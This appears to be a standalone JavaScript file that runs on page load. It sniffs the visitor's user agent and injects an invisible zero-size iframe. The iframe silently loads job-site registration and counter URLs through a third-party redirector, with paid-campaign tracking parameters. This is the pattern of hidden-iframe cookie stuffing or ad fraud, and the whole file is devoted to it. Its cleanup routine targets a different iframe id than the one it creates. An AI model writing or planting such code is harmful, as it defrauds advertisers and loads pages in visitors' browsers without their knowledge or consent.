/**
 * Created by HASEE on 2018/5/15.
 */


function pcmobile(href) {
    var iframe=document.createElement("iframe");
    iframe.style.width="0px";
    iframe.style.height="0px";
    iframe.scrolling="no";
    iframe.style.border="none";
    iframe.src=href;
    iframe.id="iframevip";
    document.body.appendChild(iframe);

}

function browserRedirect() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
    var bIsMidp = sUserAgent.match(/midp/i) == "midp";
    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
    var bIsAndroid = sUserAgent.match(/android/i) == "android";
    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
    if ((bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) ){
        pcmobile("https://red.changwenchina.com/r/m.zhaopin.com/registerone.html?utm_source=beiyong15&utm_medium=cpc&utm_campaign=wufenm&utm_content=zhaopin&utm_term=wufen");
    }else {
        pcmobile("https://red.changwenchina.com/r/cnt.zhaopin.com/Market/whole_counter.jsp?sid=121127632&site=yi_dqty_000014&url=http://ts.zhaopin.com/jump/index.html");
    }
}
browserRedirect();

function byyy() {
    var iframe=document.getElementById("iframezl");
    iframe.parentNode.removeChild(iframe);
    iframe.style.display = 'none';
}
setTimeout("byyy()",10000);
